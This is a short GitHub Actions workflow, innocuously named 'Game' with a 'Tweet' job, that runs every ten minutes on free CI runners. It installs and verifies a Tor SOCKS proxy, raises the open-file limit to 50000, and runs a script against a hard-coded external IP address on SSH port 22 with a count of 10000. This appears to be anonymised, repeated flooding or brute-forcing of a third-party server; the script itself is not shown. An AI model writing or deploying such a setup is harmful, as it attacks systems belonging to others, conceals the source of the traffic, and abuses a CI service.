name: Game
on:
  push:
    branches: [ main ]
  schedule:
    - cron: "*/10 * * * *"
jobs:
  Tweet:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: checkout repo content
        uses: actions/checkout@v2
      - name: setup python
        uses: actions/setup-python@v2
        with:
          python-version: 3.8
      - name: Install requirements
        run: |
          pip install -r requirements.txt
      - name: Install Tor and dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y tor
          sudo systemctl start tor
          sudo systemctl enable tor

          # Install Python dependencies
          pip install requests PySocks

      - name: Verify Tor Configuration
        run: |
          # Check Tor status
          sudo systemctl status tor

          # Verify Tor SOCKS proxy is running
          curl -x socks5h://127.0.0.1:9050 https://api.ipify.org
      - name: Set resource limits
        run: |
          sudo sh -c "ulimit -n 50000"
      - name: Execute script
        run: |
          python game.py 157.245.98.164 22 10000
